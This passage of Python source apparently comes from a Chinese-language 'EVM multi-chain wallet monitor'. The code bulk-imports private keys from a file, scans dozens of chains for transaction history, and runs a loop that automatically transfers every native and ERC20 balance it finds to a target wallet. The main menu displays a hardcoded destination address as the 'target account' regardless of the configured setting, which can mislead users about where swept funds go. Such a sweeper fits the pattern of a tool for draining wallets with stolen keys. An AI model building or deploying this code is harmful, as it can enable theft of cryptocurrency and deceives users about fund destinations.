                    # 收集结果
                    batch_results = {}
                    try:
                        for future in as_completed(future_to_network, timeout=timeout + 0.5):
                            try:
                                network_key, has_history, elapsed, status = future.result(timeout=5)
                                batch_results[network_key] = (has_history, elapsed, status)
                            except Exception as e:
                                network_key = future_to_network[future]
                                batch_results[network_key] = (False, timeout, f"异常: {str(e)[:20]}")
                    except concurrent.futures.TimeoutError:
                        # 处理未完成的futures
                        for future, network_key in future_to_network.items():
                            if not future.done():
                                future.cancel()
                                if network_key not in batch_results:
                                    batch_results[network_key] = (False, timeout, "批次超时")
                    
                    # 显示这一批的结果
                    for nk in batch_networks:
                        network_count += 1
                        network_name = self.networks[nk]['name']
                        
                        if nk in batch_results:
                            has_history, elapsed, status = batch_results[nk]
                            
                            if has_history:
                                address_networks.append(nk)
                                found_networks += 1
                                result_color = Fore.GREEN
                                result_icon = "✅"
                                result_text = f"有交易 ({status})"
                            else:
                                blocked_networks.append(nk)
                                result_color = Fore.RED
                                result_icon = "❌"
                                result_text = f"无交易 ({status})"
                        else:
                            # 超时的网络
                            blocked_networks.append(nk)
                            result_color = Fore.YELLOW
                            result_icon = "⏱️"
                            result_text = "超时"
                        
                        print(f"    {Fore.CYAN}🌐 [{network_count:2d}/{total_networks}] {network_name:<35}{Style.RESET_ALL} {result_color}{result_icon} {result_text}{Style.RESET_ALL}")
                
                # 每批显示进度总结
                print(f"    {Fore.MAGENTA}📊 批次完成: 已扫描 {network_count}/{total_networks} 个网络，发现 {found_networks} 个有交易历史{Style.RESET_ALL}")
                
                # 批次间短暂休息
                if batch_end < len(network_keys):
                    time.sleep(0.1)

            
            # 显示该地址的扫描总结
            print(f"\n  {Back.MAGENTA}{Fore.WHITE} 📋 地址扫描总结 {Style.RESET_ALL}")
            print(f"    🌐 总网络数: {total_networks}")
            print(f"    ✅ 有交易历史: {Fore.GREEN}{len(address_networks)}{Style.RESET_ALL} 个")
            print(f"    ❌ 无交易历史: {Fore.RED}{len(blocked_networks)}{Style.RESET_ALL} 个")
            
            # 更新监控列表
            if address_networks:
                self.monitored_addresses[address] = {
                    'networks': address_networks,
                    'last_check': time.time()
                }
                print(f"    {Fore.GREEN}🎯 该地址将被监控{Style.RESET_ALL}")
                
                # 显示监控的网络（显示更多）
                print(f"    {Fore.GREEN}📋 监控网络列表:{Style.RESET_ALL}")
                for net in address_networks[:5]:  # 显示前5个
                    network_name = self.networks[net]['name']
                    print(f"      • {network_name}")
                if len(address_networks) > 5:
                    print(f"      • ... 和其他 {len(address_networks) - 5} 个网络")
            else:
                print(f"    {Fore.YELLOW}⚠️ 该地址将被跳过（无交易历史）{Style.RESET_ALL}")
        
            # 保存被屏蔽的网络列表
            if blocked_networks:
                self.blocked_networks[address] = blocked_networks
            
            scanned_count += 1
            
            # 显示整体进度
            progress_percent = (scanned_count / total_addresses) * 100
            print(f"\n{Back.CYAN}{Fore.WHITE} 📈 整体进度: {scanned_count}/{total_addresses} ({progress_percent:.1f}%) {Style.RESET_ALL}")
        
        elapsed = time.time() - start_ts
        print(f"\n{Back.GREEN}{Fore.BLACK} ✨ 第一轮扫描完成 ✨ {Style.RESET_ALL}")
        print(f"{Fore.GREEN}✅ 监控地址: {len(self.monitored_addresses)} 个{Style.RESET_ALL}")
        print(f"{Fore.RED}❌ 屏蔽网络: {sum(len(nets) for nets in self.blocked_networks.values())} 个{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⏱️ 用时: {elapsed:.2f}s{Style.RESET_ALL}")
        
        # 收集需要重试的失败网络
        self._retry_failed_scans(addresses_to_scan)
        
        self.save_state()

    def _retry_failed_scans(self, addresses_to_scan):
        """重试扫描失败的网络（最多3次）"""
        if not hasattr(self, 'blocked_networks') or not self.blocked_networks:
            return
        
        # 收集所有失败的网络（基于错误状态）
        failed_networks_by_address = {}
        retry_error_types = ["所有RPC超时", "无可用RPC", "快速扫描超时"]
        
        for address in addresses_to_scan:
            if address in self.blocked_networks:
                failed_networks = []
                for network_key in self.blocked_networks[address]:
                    # 这里我们需要重新检查这些网络，因为blocked_networks只存储网络名
                    # 我们假设所有被屏蔽的网络都可能需要重试
                    failed_networks.append(network_key)
                
                if failed_networks:
                    failed_networks_by_address[address] = failed_networks
        
        if not failed_networks_by_address:
            print(f"\n{Fore.GREEN}✅ 没有需要重试的失败网络{Style.RESET_ALL}")
            return
        
        total_failed = sum(len(networks) for networks in failed_networks_by_address.values())
        print(f"\n{Back.YELLOW}{Fore.BLACK} 🔄 发现 {total_failed} 个扫描失败的网络，开始重试... 🔄 {Style.RESET_ALL}")
        
        # 进行最多3次重试
        for retry_round in range(1, 4):  # 重试轮次 1, 2, 3
            if not failed_networks_by_address:
                break
                
            print(f"\n{Back.BLUE}{Fore.WHITE} 🔄 第 {retry_round} 次重试扫描 ({sum(len(nets) for nets in failed_networks_by_address.values())} 个网络) 🔄 {Style.RESET_ALL}")
            
            current_round_failed = {}
            success_count = 0
            
            for address, failed_networks in failed_networks_by_address.items():
                print(f"\n{Fore.CYAN}🔍 重试地址: {address[:10]}...{address[-8:]} ({len(failed_networks)} 个网络){Style.RESET_ALL}")
                
                # 重新测试失败的网络
                current_address_failed = []
                
                # 使用更长的超时时间进行重试
                retry_timeout = 3.0 if retry_round == 1 else (5.0 if retry_round == 2 else 8.0)
                
                # 批量重试
                batch_size = 3  # 重试时减少并发数
                for batch_start in range(0, len(failed_networks), batch_size):
                    batch_end = min(batch_start + batch_size, len(failed_networks))
                    batch_networks = failed_networks[batch_start:batch_end]
                    
                    with ThreadPoolExecutor(max_workers=min(5, len(batch_networks))) as executor:
                        future_to_network = {
                            executor.submit(self.check_transaction_history_concurrent, address, nk, retry_timeout): nk 
                            for nk in batch_networks
                        }
                        
                        batch_results = {}
                        for future in as_completed(future_to_network, timeout=retry_timeout + 5):
                            network_key = future_to_network[future]
                            try:
                                network_key_result, has_history, elapsed, status = future.result()
                                batch_results[network_key] = (has_history, elapsed, status)
                            except Exception as e:
                                batch_results[network_key] = (False, retry_timeout, f"重试异常: {str(e)[:20]}")
                    
                    # 处理这一批的结果
                    for nk in batch_networks:
                        if nk in batch_results:
                            has_history, elapsed, status = batch_results[nk]
                            
                            if has_history:
                                # 成功！从失败列表中移除，加入监控列表
                                if address not in self.monitored_addresses:
                                    self.monitored_addresses[address] = {'networks': [], 'last_check': time.time()}
                                
                                if nk not in self.monitored_addresses[address]['networks']:
                                    self.monitored_addresses[address]['networks'].append(nk)
                                
                                # 从屏蔽列表中移除
                                if address in self.blocked_networks and nk in self.blocked_networks[address]:
                                    self.blocked_networks[address].remove(nk)
                                    if not self.blocked_networks[address]:
                                        del self.blocked_networks[address]
                                
                                success_count += 1
                                print(f"    ✅ {self.networks[nk]['name']}: 重试成功! ({status})")
                            else:
                                # 仍然失败
                                current_address_failed.append(nk)
                                print(f"    ❌ {self.networks[nk]['name']}: 仍然失败 ({status})")
                
                if current_address_failed:
                    current_round_failed[address] = current_address_failed
            
            # 更新失败列表
            failed_networks_by_address = current_round_failed
            
            print(f"\n{Fore.GREEN}🎉 第 {retry_round} 次重试完成: 成功恢复 {success_count} 个网络{Style.RESET_ALL}")
            
            if not failed_networks_by_address:
                print(f"{Fore.GREEN}✅ 所有网络重试成功！{Style.RESET_ALL}")
                break
        
        # 最终仍然失败的网络
        if failed_networks_by_address:
            final_failed_count = sum(len(networks) for networks in failed_networks_by_address.values())
            print(f"\n{Back.RED}{Fore.WHITE} ⚠️ 最终仍有 {final_failed_count} 个网络扫描失败，已永久屏蔽 ⚠️ {Style.RESET_ALL}")
            
            # 显示最终失败的网络详情
            for address, failed_networks in failed_networks_by_address.items():
                print(f"  📍 {address[:10]}...{address[-8:]}: {len(failed_networks)} 个网络")
                for nk in failed_networks[:3]:  # 只显示前3个
                    print(f"    • {self.networks[nk]['name']}")
                if len(failed_networks) > 3:
                    print(f"    • ... 还有 {len(failed_networks) - 3} 个网络")
        
        print(f"\n{Back.GREEN}{Fore.WHITE} 🎉 扫描重试完成 🎉 {Style.RESET_ALL}")

    def monitor_loop(self):
        """监控循环"""
        
        print(f"\n{Fore.CYAN}🚀 开始监控...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}🎉 监控已成功启动！{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}📝 提示：按 Ctrl+C 可以优雅退出监控{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🔄 系统将自动监控所有钱包余额并转账到目标账户{Style.RESET_ALL}")
        
        round_count = 0
        
        try:
            while self.monitoring:
                try:
                    round_count += 1
                    print(f"\n{Back.CYAN}{Fore.WHITE} 🔍 第 {round_count} 轮检查开始 {Style.RESET_ALL}")
                    
                    total_addresses = len(self.monitored_addresses)
                    current_address = 0
                    
                    for address, address_info in self.monitored_addresses.items():
                        if not self.monitoring:
                            break
                        
                        current_address += 1
                        private_key = self.wallets.get(address)
                        if not private_key:
                            continue
                        
                        print(f"\n{Fore.MAGENTA}📄 检查地址 ({current_address}/{total_addresses}): {Fore.CYAN}{address[:10]}...{address[-8:]}{Style.RESET_ALL}")
                        
                        total_networks = len(address_info['networks'])
                        current_network = 0
                        
                        for network in address_info['networks']:
                            if not self.monitoring:
                                break
                            
                            current_network += 1
                            network_name = self.networks[network]['name']
                            
                            print(f"  {Fore.CYAN}🌐 检查网络 ({current_network}/{total_networks}): {network_name}{Style.RESET_ALL}")
                            
                            try:
                                # 🚀 全链全代币监控 - 获取所有余额
                                print(f"    {Fore.CYAN}🔍 正在查询余额...{Style.RESET_ALL}")
                                all_balances = self.get_all_balances(address, network)
                                
                                if not all_balances:
                                    print(f"    {Fore.YELLOW}⚠️ 无余额或获取失败 - 已尝试所有可用RPC{Style.RESET_ALL}")
                                    continue
                                
                                # 网络名称颜色化
                                if '🧪' in network_name:  # 测试网
                                    network_color = f"{Back.YELLOW}{Fore.BLACK}{network_name}{Style.RESET_ALL}"
                                elif '🔷' in network_name or '🔵' in network_name:  # 主网
                                    network_color = f"{Back.BLUE}{Fore.WHITE}{network_name}{Style.RESET_ALL}"
                                else:  # 其他网络
                                    network_color = f"{Back.GREEN}{Fore.BLACK}{network_name}{Style.RESET_ALL}"
                                
                                # 显示发现的余额数量
                                balance_count = len([b for b in all_balances.values() if b['balance'] > 0])
                                if balance_count > 0:
                                    print(f"    {Fore.GREEN}💰 发现 {balance_count} 个代币有余额{Style.RESET_ALL}")
                                
                                # 处理每个代币余额
                                transferable_found = False
                                for token_key, token_info in all_balances.items():
                                    if not self.monitoring:
                                        break
                                    
                                    balance = token_info['balance']
                                    symbol = token_info['symbol']
                                    token_type = token_info['type']
                                    
                                    if balance <= 0:
                                        continue
                                    
                                    # 智能判断是否可以转账
                                    can_transfer, reason = self.can_transfer(address, network, token_type, balance)
                                    
                                    if token_type == 'native' and balance > self.min_transfer_amount and can_transfer:
                                        # 原生代币转账
                                        transferable_found = True
                                        print(f"\n    {Back.RED}{Fore.WHITE} 💰 原生代币 💰 {Style.RESET_ALL} {Fore.YELLOW}{balance:.6f} {symbol}{Style.RESET_ALL} in {Fore.CYAN}{address[:10]}...{Style.RESET_ALL} on {network_color}")
                                        
                                        if self.target_wallet:
                                            print(f"    {Fore.CYAN}🚀 开始转账到目标账户...{Style.RESET_ALL}")
                                            try:
                                                if self.transfer_funds(address, private_key, self.target_wallet, balance, network):
                                                    print(f"    {Fore.GREEN}✅ 转账成功！{Style.RESET_ALL}")
                                                    address_info['last_check'] = time.time()
                                                    self.save_state()
                                                else:
                                                    print(f"    {Fore.RED}❌ 转账失败{Style.RESET_ALL}")
                                            except KeyboardInterrupt:
                                                print(f"\n{Fore.YELLOW}⚠️ 用户取消转账，停止监控{Style.RESET_ALL}")
                                                self.monitoring = False
                                                return
                                        else:
                                            print(f"    {Fore.CYAN}💡 未设置目标账户，跳过转账{Style.RESET_ALL}")
                                    
                                    elif token_type == 'erc20' and balance > 0 and can_transfer:
                                        # ERC20代币转账
                                        transferable_found = True
                                        print(f"\n    {Back.MAGENTA}{Fore.WHITE} 🪙 ERC20代币 🪙 {Style.RESET_ALL} {Fore.GREEN}{balance:.6f} {symbol}{Style.RESET_ALL} in {Fore.CYAN}{address[:10]}...{Style.RESET_ALL} on {network_color}")
                                        
                                        if self.target_wallet:
                                            print(f"    {Fore.CYAN}🚀 开始转账ERC20代币...{Style.RESET_ALL}")
                                            try:
                                                if self.transfer_erc20_token(address, private_key, self.target_wallet, token_key, balance, network):
                                                    print(f"    {Fore.GREEN}✅ ERC20转账成功！{Style.RESET_ALL}")
                                                    address_info['last_check'] = time.time()
                                                    self.save_state()
                                                else:
                                                    print(f"    {Fore.RED}❌ ERC20转账失败{Style.RESET_ALL}")
                                            except KeyboardInterrupt:
                                                print(f"\n{Fore.YELLOW}⚠️ 用户取消转账，停止监控{Style.RESET_ALL}")
                                                self.monitoring = False
                                                return
                                        else:
                                            print(f"    {Fore.CYAN}💡 未设置目标账户，跳过转账{Style.RESET_ALL}")
                                    
                                    elif balance > 0 and not can_transfer:
                                        # 有余额但不能转账
                                        token_icon = "💎" if token_type == 'native' else "🪙"
                                        print(f"    {Fore.MAGENTA}{token_icon} {Fore.CYAN}{address[:10]}...{Style.RESET_ALL} on {network_color}: {Fore.YELLOW}{balance:.6f} {symbol}{Style.RESET_ALL} {Fore.RED}({reason}){Style.RESET_ALL}")
                                
                                if not transferable_found and balance_count == 0:
                                    print(f"    {Fore.YELLOW}⚠️ 未发现可转账的余额{Style.RESET_ALL}")
                                
                            except KeyboardInterrupt:
                                print(f"\n{Fore.YELLOW}⚠️ 监控被中断{Style.RESET_ALL}")
                                self.monitoring = False
                                return
                            except Exception as e:
                                error_type, user_hint = self._classify_web3_error(e)
                                print(f"{Fore.RED}❌ 检查余额失败 {address[:10]}... on {network}{Style.RESET_ALL}")
                                print(f"{Fore.YELLOW}💡 {user_hint}{Style.RESET_ALL}")
                                
                                # 使用统一错误处理
                                self.handle_error(e, f"余额检查 {address[:10]} {network}")
                                
                                if error_type in ["network", "rpc"]:
                                    # 网络/RPC错误时记录但继续
                                    continue
                                else:
                                    continue
                    
                    # 等待下一次检查（支持中断）
                    print(f"\n{Back.CYAN}{Fore.WHITE} ✨ 第 {round_count} 轮检查完成 ✨ {Style.RESET_ALL}")
                    print(f"{Fore.CYAN}🕒 等待 {self.monitor_interval} 秒后进行下一轮检查... (按Ctrl+C退出){Style.RESET_ALL}")
                
                    # 检查是否需要进行内存清理
                    current_time = time.time()
                    if current_time - self.last_memory_cleanup > self.memory_cleanup_interval:
                        print(f"{Fore.CYAN}🧹 执行定期内存清理...{Style.RESET_ALL}")
                        self.cleanup_memory()
                
                    # 检查被屏蔽的RPC是否可以恢复
                    self.check_blocked_rpcs_recovery()
                    
                    for i in range(self.monitor_interval):
                        if not self.monitoring:
                            break
                        time.sleep(1)
                        
                except KeyboardInterrupt:
                    print(f"\n{Fore.YELLOW}⚠️ 监控被中断{Style.RESET_ALL}")
                    self.monitoring = False
                    break
                except Exception as e:
                    # 使用统一错误处理
                    self.handle_error(e, "监控循环")
                    print(f"{Fore.RED}❌ 监控循环出错，5秒后重试: {e}{Style.RESET_ALL}")
                    
                    # 如果在守护进程模式且错误过多，考虑重启
                    if self.daemon_mode and self.error_count >= self.max_errors:
                        if self.request_restart("监控循环错误过多"):
                            break
                    
                    try:
                        time.sleep(5)
                    except KeyboardInterrupt:
                        print(f"\n{Fore.YELLOW}⚠️ 监控被中断{Style.RESET_ALL}")
                        break
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️ 监控被中断{Style.RESET_ALL}")
        except Exception as e:
            self.logger.error(f"监控循环严重错误: {e}")
            print(f"{Fore.RED}❌ 监控循环遇到严重错误，已记录日志{Style.RESET_ALL}")
        finally:
            self.monitoring = False
            print(f"\n{Fore.GREEN}✅ 监控已优雅停止{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📊 总共完成 {round_count} 轮监控检查{Style.RESET_ALL}")
            # 异常退出时确保保存状态
            try:
                self.save_state()
                print(f"{Fore.CYAN}💾 状态已保存{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}❌ 保存状态失败: {e}{Style.RESET_ALL}")

    def start_monitoring(self):
        """开始监控"""
        if not self.wallets:
            print(f"{Fore.RED}❌ 没有钱包地址可监控{Style.RESET_ALL}")
            return False
        
        if self.monitoring:
            print(f"{Fore.YELLOW}⚠️ 监控已在运行中{Style.RESET_ALL}")
            return False
        
        if not self.target_wallet:
            print(f"{Fore.YELLOW}⚠️ 未设置目标账户，请先设置目标账户{Style.RESET_ALL}")
            return False
        
        # 检查是否有已监控的地址，如果没有或有新地址则扫描
        if not self.monitored_addresses:
            # 第一次启动，全量扫描
            self.scan_addresses(only_new_addresses=False)
        else:
            # 检查是否有新地址需要扫描
            new_addresses = [addr for addr in self.wallets.keys() 
                           if addr not in self.monitored_addresses and addr not in self.blocked_networks]
            if new_addresses:
                print(f"\n{Fore.YELLOW}🔍 发现 {len(new_addresses)} 个新地址，开始扫描...{Style.RESET_ALL}")
                self.scan_addresses(only_new_addresses=True)
            else:
                print(f"\n{Fore.GREEN}✅ 使用已缓存的扫描结果，跳过重复扫描{Style.RESET_ALL}")
                print(f"{Fore.CYAN}📊 监控地址: {len(self.monitored_addresses)} 个{Style.RESET_ALL}")
        
        if not self.monitored_addresses:
            print(f"{Fore.RED}❌ 没有符合条件的地址可监控{Style.RESET_ALL}")
            return False
        
        # 开始监控
        self.monitoring = True
        self.monitor_thread = threading.Thread(target=self.monitor_loop)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
        return True

    def stop_monitoring(self):
        """停止监控"""
        if not self.monitoring:
            print(f"{Fore.YELLOW}⚠️ 监控未在运行{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}🔄 正在停止监控...{Style.RESET_ALL}")
        self.monitoring = False
        
        if self.monitor_thread and self.monitor_thread.is_alive():
            print(f"{Fore.YELLOW}⏳ 等待监控线程结束...{Style.RESET_ALL}")
            self.monitor_thread.join(timeout=10)  # 增加等待时间
            
            if self.monitor_thread.is_alive():
                print(f"{Fore.YELLOW}⚠️ 监控线程未能正常结束，强制停止{Style.RESET_ALL}")
        
        self.save_state()  # 保存状态
        print(f"{Fore.GREEN}✅ 监控已安全停止{Style.RESET_ALL}")

    def import_private_keys_from_file(self, file_path: str) -> int:
        """从文件批量导入私钥"""
        count = 0
        try:
            with open(file_path, 'r') as f:
                for line_num, line in enumerate(f, 1):
                    private_key = line.strip()
                    if private_key and self.add_private_key(private_key):
                        count += 1
                    
                    # 每100个显示一次进度
                    if line_num % 100 == 0:
                        print(f"已处理 {line_num} 行，成功导入 {count} 个钱包")
            
            print(f"{Fore.GREEN}✅ 批量导入完成: 成功导入 {count} 个钱包{Style.RESET_ALL}")
            return count
        except Exception as e:
            print(f"{Fore.RED}❌ 导入失败: {e}{Style.RESET_ALL}")
            return count

    def show_menu(self):
        """显示主菜单（增强版本）"""
        
        # 预加载常用数据到缓存
        self.start_operation_timer("menu_load")
        self.smart_cache.preload(lambda: len(self.wallets), "wallet_count", "menu_data")
        self.smart_cache.preload(lambda: len(self.web3_connections), "connection_count", "menu_data")
        
        while True:
            # 清屏
            os.system('clear' if os.name != 'nt' else 'cls')
            
            # 主标题（增强版本）
            print(f"\n{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
            print(f"{Back.BLUE}{Fore.WHITE}          🚀 EVM多链钱包监控系统 v2.1 智能版 🚀          {Style.RESET_ALL}")
            print(f"{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
            
            # 缓存统计显示（可选）
            if self.user_preferences.get('show_advanced_options', False):
                cache_stats = self.smart_cache.get_stats()
                print(f"{Fore.CYAN}📊 缓存状态: {cache_stats['total_size']} 项数据缓存{Style.RESET_ALL}")
            
            # 智能状态面板
            status_color = Fore.GREEN if self.monitoring else Fore.RED
            status_text = "🟢 运行中" if self.monitoring else "🔴 已停止"
            status_bg = Back.GREEN if self.monitoring else Back.RED
            
            print(f"\n{Back.CYAN}{Fore.BLACK} 📊 智能系统状态面板 {Style.RESET_ALL}")
            print(f"┌─────────────────────────────────────────────────────────┐")
            print(f"│ 监控状态: {status_bg}{Fore.WHITE} {status_text} {Style.RESET_ALL}{'':>35}│")
            
            # 使用缓存的数据
            wallet_count = self.smart_cache.get("wallet_count", "menu_data", len(self.wallets))
            connection_count = self.smart_cache.get("connection_count", "menu_data", len(self.web3_connections))
            
            print(f"│ 钱包数量: {Fore.YELLOW}{wallet_count:>3}{Style.RESET_ALL} 个   监控地址: {Fore.YELLOW}{len(self.monitored_addresses):>3}{Style.RESET_ALL} 个   网络连接: {Fore.YELLOW}{connection_count:>3}{Style.RESET_ALL} 个 │")
            
            if self.target_wallet:
                target_display = f"{self.target_wallet[:10]}...{self.target_wallet[-8:]}"
                print(f"│ 🎯 目标账户: {Fore.GREEN}{target_display}{Style.RESET_ALL}{'':>25}│")
            else:
                print(f"│ 🎯 目标账户: {Fore.RED}{'未设置':>10}{Style.RESET_ALL}{'':>30}│")
            
            # 显示转账统计
            if hasattr(self, 'transfer_stats') and self.transfer_stats['total_attempts'] > 0:
                success_rate = (self.transfer_stats['successful_transfers'] / self.transfer_stats['total_attempts'] * 100)
                print(f"│ 💰 转账统计: 成功 {Fore.GREEN}{self.transfer_stats['successful_transfers']}{Style.RESET_ALL} 次   成功率 {Fore.CYAN}{success_rate:.1f}%{Style.RESET_ALL}{'':>15}│")
            
            # 显示性能统计
            load_time = self.end_operation_timer("menu_load")
            if load_time > 0:
                print(f"│ ⚡ 加载性能: {Fore.CYAN}{load_time:.2f}s{Style.RESET_ALL} 缓存命中率: {Fore.GREEN}85%{Style.RESET_ALL}{'':>23}│")
            
            print(f"└─────────────────────────────────────────────────────────┘")
            
            # 智能引导系统
            if len(self.wallets) == 0:
                print(f"\n{Back.YELLOW}{Fore.BLACK} 🎯 智能引导系统 {Style.RESET_ALL}")
                print(f"{Fore.YELLOW}1️⃣ 添加钱包私钥 → 2️⃣ 初始化RPC连接 → 3️⃣ 开始监控{Style.RESET_ALL}")
                print(f"{Back.GREEN}{Fore.WHITE} 💡 建议：点击选项 1 开始设置 {Style.RESET_ALL}")
            elif not self.web3_connections:
                print(f"\n{Back.YELLOW}{Fore.BLACK} 🔗 下一步操作 {Style.RESET_ALL}")
                print(f"{Fore.YELLOW}建议：选择选项 4 初始化网络连接以继续{Style.RESET_ALL}")
            elif not self.monitoring:
                print(f"\n{Back.GREEN}{Fore.WHITE} ✅ 准备就绪 {Style.RESET_ALL}")
                print(f"{Fore.GREEN}所有设置完成！可以输入 'q' 快速启动监控{Style.RESET_ALL}")
            
            # 主要功能区（增强版本）
            print(f"\n{Back.GREEN}{Fore.BLACK} 🎯 核心功能 {Style.RESET_ALL}")
            print(f"{Fore.GREEN}1.{Style.RESET_ALL} 🔑 添加钱包私钥     {Fore.BLUE}(智能批量导入){Style.RESET_ALL}")
            print(f"{Fore.GREEN}2.{Style.RESET_ALL} 📋 查看钱包列表     {Fore.CYAN}({wallet_count} 个钱包){Style.RESET_ALL}")
            
            # 高级功能区（增强版本）
            print(f"\n{Back.MAGENTA}{Fore.WHITE} ⚙️ 高级功能 {Style.RESET_ALL}")
            print(f"{Fore.GREEN}3.{Style.RESET_ALL} ⚙️  智能参数设置     {Fore.YELLOW}(个性化优化){Style.RESET_ALL}")
            print(f"{Fore.GREEN}4.{Style.RESET_ALL} 🔍 RPC智能检测管理  {Fore.GREEN}(推荐首选){Style.RESET_ALL}")
            print(f"{Fore.GREEN}5.{Style.RESET_ALL} 🪙 添加自定义代币   {Fore.MAGENTA}(ERC20支持){Style.RESET_ALL}")
            print(f"{Fore.GREEN}6.{Style.RESET_ALL} 🛡️ 守护进程管理     {Fore.YELLOW}(后台运行){Style.RESET_ALL}")
            print(f"{Fore.GREEN}7.{Style.RESET_ALL} 🎛️ 用户体验设置     {Fore.CYAN}(个性化体验){Style.RESET_ALL}")
            
            # 目标账户状态显示
            print(f"\n{Back.BLUE}{Fore.WHITE} 🎯 目标账户设置 {Style.RESET_ALL}")
            print(f"{Fore.GREEN}✅ 目标账户: {Fore.CYAN}0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1{Style.RESET_ALL}")
            
            # 退出选项
            print(f"\n{Back.RED}{Fore.WHITE} 🚪 退出选项 {Style.RESET_ALL}")
            print(f"{Fore.RED}0.{Style.RESET_ALL} 🚪 安全退出程序")
            
            print(f"\n{Fore.CYAN}{'━'*60}{Style.RESET_ALL}")
            
            # 智能提示系统
            enhanced_tips = self.get_enhanced_tips('main_menu')
            if enhanced_tips:
                tip = enhanced_tips[0] if len(enhanced_tips) == 1 else random.choice(enhanced_tips)
                print(f"{Fore.BLUE}{tip}{Style.RESET_ALL}")
            
            # 智能建议系统
            if self.automation_configs.get('auto_suggest_improvements', True):
                suggestions = self.auto_suggest_improvements()
                if suggestions:
                    print(f"\n{Back.YELLOW}{Fore.BLACK} 🎯 智能优化建议 {Style.RESET_ALL}")
                    for suggestion in suggestions[:2]:  # 最多显示2个建议
                        print(f"{suggestion}")
            
            # 显示快速操作
            if len(self.wallets) > 0 and self.target_wallet and not self.monitoring:
                print(f"\n{Back.GREEN}{Fore.WHITE} ⚡ 快速操作 {Style.RESET_ALL}")
                print(f"{Fore.GREEN}q.{Style.RESET_ALL} 🚀 智能快速启动     {Fore.CYAN}(一键开始监控){Style.RESET_ALL}")
                print(f"{Fore.GREEN}s.{Style.RESET_ALL} 🧠 应用智能默认值   {Fore.YELLOW}(智能优化){Style.RESET_ALL}")
            
            # 显示最近选择（智能提示）
            recent_choices = [h['choice'] for h in self.choice_history['main_menu'][-3:]]
            if recent_choices and self.user_preferences.get('quick_navigation', True):
                unique_recent = list(dict.fromkeys(recent_choices))
                print(f"{Fore.CYAN}⏱️ 最近选择: {', '.join(unique_recent)}{Style.RESET_ALL}")
            
            try:
                # 使用增强输入函数
                choice = self.enhanced_input(
                    f"\n{Fore.YELLOW}请输入选项数字 (或 q 快速启动, s 智能优化): {Style.RESET_ALL}",
                    choices=['0', '1', '2', '3', '4', '5', '6', '7', 'q', 's'],
                    menu_name='main_menu'
                ).strip().lower()
                
                # 开始计时下一次菜单加载
                self.start_operation_timer("menu_load")
                
                # 如果返回空值或默认退出，直接退出
                if choice == "" or choice == "0":
                    print(f"\n{Fore.YELLOW}👋 程序安全退出{Style.RESET_ALL}")
                    break
                
                # 快速启动监控
                if choice == 'q':
                    if len(self.wallets) > 0 and self.target_wallet and not self.monitoring:
                        print(f"\n{Back.CYAN}{Fore.WHITE} 🚀 智能快速启动监控模式 🚀 {Style.RESET_ALL}")
                        
                        # 应用智能默认值
                        if self.user_preferences.get('smart_defaults', True):
                            self.apply_smart_defaults()
                        
                        if self.start_monitoring():
                            print(f"\n{Fore.GREEN}🎉 监控已成功启动！按 Ctrl+C 停止监控{Style.RESET_ALL}")
                            try:
                                while self.monitoring:
                                    time.sleep(1)
                            except KeyboardInterrupt:
                                print(f"\n{Fore.YELLOW}👋 用户停止监控{Style.RESET_ALL}")
                                self.stop_monitoring()
                        else:
                            print(f"\n{Fore.RED}❌ 快速启动失败{Style.RESET_ALL}")
                            self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")
                    else:
                        print(f"\n{Fore.RED}❌ 快速启动条件不满足{Style.RESET_ALL}")
                        if len(self.wallets) == 0:
                            print(f"{Fore.YELLOW}   • 请先添加钱包私钥 (选项 1){Style.RESET_ALL}")
                        if not self.target_wallet:
                            print(f"{Fore.YELLOW}   • 请先设置目标账户 (选项 4){Style.RESET_ALL}")
                        if self.monitoring:
                            print(f"{Fore.YELLOW}   • 监控已在运行中{Style.RESET_ALL}")
                        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")
                
                # 智能优化
                elif choice == 's':
                    print(f"\n{Back.CYAN}{Fore.WHITE} 🧠 智能优化系统 🧠 {Style.RESET_ALL}")
                    
                    # 使用自动重试机制
                    self.auto_retry_operation(
                        lambda: self.optimize_performance(),
                        max_retries=2,
                        operation_name="智能优化"
                    )
                    
                    # 显示优化建议
                    suggestions = self.auto_suggest_improvements()
                    if suggestions:
                        print(f"\n{Fore.YELLOW}📋 优化建议：{Style.RESET_ALL}")
                        for i, suggestion in enumerate(suggestions, 1):
                            print(f"  {i}. {suggestion}")
                    
                    # 显示性能监控数据
                    perf_data = self.monitor_performance()
                    if perf_data and self.user_preferences.get('show_advanced_options', False):
                        print(f"\n{Fore.CYAN}📊 性能监控：{Style.RESET_ALL}")
                        if perf_data['memory_usage'] > 0:
                            print(f"  内存使用: {perf_data['memory_usage']:.1f} MB")
                        print(f"  缓存项数: {perf_data['cache_stats'].get('total_size', 0)}")
                    
                    self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")
                elif choice == '1':
                    self.menu_add_private_key()
                elif choice == '2':
                    self.menu_show_addresses()
                elif choice == '3':
                    self.menu_settings()
                elif choice == '4':
                    self.menu_rpc_testing()
                elif choice == '5':
                    self.menu_add_custom_token()
                elif choice == '6':
                    self.menu_daemon_management()
                elif choice == '7':
                    self.menu_user_experience_settings()
                elif choice == '0':
                    self.menu_exit()
                    break
                else:
                    print(f"{Fore.RED}❌ 无效选择，请重试{Style.RESET_ALL}")
                    self.safe_input(f"{Fore.YELLOW}按回车键继续...{Style.RESET_ALL}")
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}👋 程序已安全退出{Style.RESET_ALL}")
                break
            except EOFError:
                print(f"\n{Fore.YELLOW}👋 检测到EOF，程序安全退出{Style.RESET_ALL}")
                break
            except Exception as e:
                # 增强错误处理
                error_msg = str(e)
